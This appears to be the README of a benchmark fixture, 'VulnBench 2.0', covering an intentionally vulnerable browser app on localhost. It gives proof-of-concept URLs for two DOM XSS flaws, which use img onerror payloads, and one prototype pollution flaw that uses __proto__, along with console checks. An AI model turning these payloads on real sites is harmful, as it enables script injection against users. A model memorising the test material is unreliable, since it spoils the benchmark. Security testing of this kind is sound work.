# App Project Slingshot VulnBench 2.0 POCs

The fixture is a browser application. Install its legacy dependencies with:

```sh
npm install --ignore-scripts
npm test -- --runInBand
```

The upstream `node-sass@4` dependency does not build on Node 24 without
legacy Python 2 tooling. If the development server is available, start it
with `npm run open:src`; it listens on `http://localhost:3000`.

## Campaign DOM XSS

The home page renders the `campaign` URL parameter as HTML:

```text
http://localhost:3000/?campaign=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

## Referral DOM XSS

The About page falls back to a URL referral value and renders it as HTML:

```text
http://localhost:3000/about?referrer=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

## Prototype pollution through shared preferences

Open this URL, then inspect the console:

```text
http://localhost:3000/?section=__proto__&value=owned
```

The application processes both preference updates. These checks should return
`owned`:

```js
({}).layout
({}).display
```
